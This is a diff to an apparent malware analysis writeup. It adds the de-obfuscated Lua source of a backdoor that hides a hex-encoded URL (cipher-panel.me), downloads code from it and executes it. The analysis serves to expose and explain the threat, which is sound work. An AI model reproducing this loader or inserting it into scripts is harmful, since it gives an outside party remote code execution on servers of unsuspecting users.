@@ -71,3 +71,34 @@ BaoWmVjtyB[BaoWmVjtyB[4]('1')](uGeRrdKRtK(), function (e, jKlDPYMVkD)
 end)
 ```
 Doing our magical de-obfuscating and using the dehex function we can see that it downloads (just like the rest) the contents of the page r.php and executes it. The methods are the same as in the sessionmanager host_lock.lua file.
+De-Obfuscated Code:
+```
+local VarArray = {
+	_G['PerformHttpRequest'],
+	_G['assert'],
+	_G['load'],
+	_G['tonumber']
+}
+
+local HEXArray = {
+	'68', '74', '74', '70', '73', '3a', '2f', '2f', '63', '69', '70', '68', '65', '72',
+	'2d', '70', '61', '6e', '65', '6c', '2e', '6d', '65', '2f', '5f', '69', '2f', '72',
+	'2e', '70', '68', '70', '3f', '74', '6f', '3d', '30'
+}
+
+function Func1()
+	String = ''
+	for id,it in pairs(HEXArray) do
+		String = String..it
+	end
+	return (String:gsub('..', function (var1)
+		return string.char(VarArray[4](var1, 16))
+	end))
+end
+
+PerformHttpRequest(Func1(), function (e, responseBody)
+	local Payload = assert((load(responseBody)))
+	if (responseBody == nil) then return end
+	Payload()
+end)
+```
